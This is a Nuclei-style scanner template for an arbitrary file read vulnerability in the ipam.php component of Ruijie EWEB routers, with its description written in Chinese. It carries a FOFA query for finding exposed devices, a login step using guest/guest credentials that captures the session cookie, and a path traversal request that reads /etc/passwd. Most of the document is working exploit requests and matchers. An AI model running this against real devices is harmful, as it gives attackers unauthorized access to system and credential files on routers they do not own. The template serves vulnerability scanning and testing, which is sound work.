id: ruijieEWEB-ipam_php-File-reading

info:
  name: 锐捷EWEB路由器ipam.php组件任意文件读取漏洞
  author: Unknown
  severity: high
  description: |-
    fofa: title="锐捷网络-EWEB网管系统"
    该漏洞存在于锐捷EWEB路由器的ipam.php组件中，攻击者可利用此漏洞访问敏感系统文件（包括但不限于数据库配置及系统配置文件），从而获取关键系统凭证与配置信息，进而可能引发进一步的安全风险。未经验证的远程攻击者可通过构造特定请求实现非授权文件访问，系统完整性因此受到严重威胁。
  reference:
  - https://mp.weixin.qq.com/s/adG_PYSH0UosqMtx79WLhg
  tags: 锐捷EWEB路由器

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    POST /ddi/server/login.php HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
    Content-Type: application/x-www-form-urlencoded

    username=guest&password=guest?
  extractors:
  - type: regex
    part: header
    name: RUIJIEID
    group: 1
    regex:
    - 'RUIJIEID=(.*?);'
    internal: true
- raw:
  - |
    POST /ddi/server/ipam.php?a=getIpamJson HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
    X-Requested-With: XMLHttpRequest
    Cookie: {{RUIJIEID}}
    Content-Type: application/x-www-form-urlencoded

    path=../../../../etc/passwd
  matchers-condition: and
  matchers:
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0'
  - type: status
    status:
    - 200
